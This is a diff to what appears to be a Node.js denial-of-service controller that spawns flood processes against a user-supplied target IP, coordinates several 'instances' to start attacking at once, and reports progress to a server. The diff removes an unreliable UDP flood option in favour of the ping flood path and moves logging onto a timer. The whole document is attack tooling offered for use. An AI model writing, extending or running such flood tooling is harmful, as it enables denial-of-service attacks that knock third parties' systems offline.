@@ -59,7 +59,7 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
     function driver(ip, hostIp, port, password, useUDP) {
 
         function startSpawn(){
-            let ddos = spawn('node', ['index.js', ip, useUDP.toString()])
+            let ddos = spawn('node', ['index.js', ip])
 
             //send http request to server with ip and average
     
@@ -79,15 +79,15 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
                 }
                 j = 0
             }, 1000)
+            let logs;
             ddos.stdout.on('data', (data) => {
                 j++
                 data = data.toString().replace(/(\r\n|\n|\r)/gm, "")
-    
+
                 let iteration = `(#${i})`
-    
-                let logs = `${iteration}${data}`
-                console.log(logs)
-    
+
+                logs = `${iteration}${data}`
+                    
                 outData = logs;
                     outData = outData.replace(/ /g, '%20');
                     outData = outData.replace(/'/g, '%27');
@@ -102,7 +102,12 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
                     i++
                     startSpawn()
                 }
-            })    
+            }) 
+            setInterval(() => {
+                console.log(logs)
+            }, 1000)
+
+   
         }
         startSpawn()
     }
@@ -189,47 +194,17 @@ let name = Math.random().toString(36).substring(2, 4).toUpperCase()
         //ask for target
         readline.question('[INPUTS ARE HIDDEN DUE TO A DOUBLE CHARACTER BUG]\n\nTarget IP and PORT(optional):\n> ', (target) => {
             console.log(target)
-            readline.question('\nWhich method should we use, UDP flood(not recomended, very buggy) or PING flood? UDP/PING\n> ', (method) => {
-                let mUseUDP; 
-                if(method.toUpperCase == 'UDP') {
-                        readline.question('\nAre you sure? this method dosent work at all, its used for testing and stuff, YES/NO:\n> ', (sure) => {
-                            if(sure.toUpperCase == 'YES' || sure.toUpperCase == 'Y') {
-                                //continue on
-                                mUseUDP = true
-                            }
-                            else {
-                                mUseUDP = true
-                                console.log('Using PING flood method')
-                            }
-                        })
-                } else if(method.toUpperCase() == 'PING') {
-                    mUseUDP = false
+            readline.question(`\nSend requests to all instances to start process on ${target}? YES/NO\n>`, (confirm) => {
+                if(confirm.toUpperCase() == 'YES' || confirm.toUpperCase() == 'Y') {
+                    main(target)
                 }
                 else {
-                    console.log('Invalid method')
-                    setTimeout(() => {
-                        process.exit(0)
-                    }, 2000)
+                    process.exit(0)
                 }
-                function chosenM() {
-                    if(mUseUDP)
-                        return 'UDP'
-                    else 
-                        return 'PING'
-                }
-                readline.question(`\nSend requests to all instances to start process on ${target} using the ${chosenM()} method? YES/NO\n>`, (confirm) => {
-                    if(confirm.toUpperCase() == 'YES' || confirm.toUpperCase() == 'Y') {
-                        main(target, mUseUDP)
-                    }
-                    else {
-                        process.exit(0)
-                    }
-                })
-
             })
         })
 
-        function main(target, mUseUDP) {
+        function main(target) {
             const http = require('http');
             http.get({'host': 'api.ipify.org', 'port': 80, 'path': '/'}, function(resp) {
                 resp.on('data', function(ip) {
